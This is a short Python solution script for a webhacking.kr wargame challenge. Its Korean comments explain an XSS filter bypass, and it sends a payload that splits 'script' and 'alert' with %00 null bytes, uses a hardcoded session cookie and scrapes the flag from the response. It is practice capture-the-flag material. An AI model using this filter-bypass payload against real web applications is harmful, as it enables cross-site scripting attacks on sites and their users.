from bs4 import BeautifulSoup
import base64
import requests

URL = "https://webhacking.kr/challenge/bonus-3"
URI = "/index.php?code=<s%00c%00r%00i%00p%00t>a%00l%00e%00r%00t(1)%3b</s%00c%00r%00i%00p%00t>"
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'

cookie = {'PHPSESSID':PHPSESSID}

# 풀이
# 1. 특수문자, 숫자는 필터링이 안되는 것을 확인하였고, </>은 필터되는데 </(?)>는 필터 안됨
# 2. 연속된 ascii 문자열은 필터가 되므로 사이에 NULL 문자에 해당하는 %00을 넣어서 필터 우회

resp = requests.get(URL + URI, cookies=cookie)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)